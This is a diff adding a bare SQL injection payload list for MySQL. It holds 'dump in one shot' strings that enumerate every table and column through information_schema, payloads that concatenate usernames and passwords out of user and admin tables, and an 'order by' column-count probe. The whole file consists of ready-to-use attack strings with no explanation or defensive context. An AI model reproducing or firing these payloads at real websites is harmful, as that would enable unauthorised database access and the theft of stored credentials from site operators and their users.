@@ -1,0 +1,11 @@
+(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x)<br>
+<br>
+<br>
+/*!50000(SELECT+GROUP_CONCAT([username],0x3a,[password]+SEPARATOR+0x3c62723e)+FROM+[dbuser])*/<br>
+<br>
+-----------------------------<br>
+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)<br>
+<br>
+make_set(6,@:=0x0a,(select(1)from(admin)where@:=make_set(511,@,0x3c6c693e,USER_NAME,PASSWORD)),@)--<br>
+<br>
+&apos;+order+by+1--+-
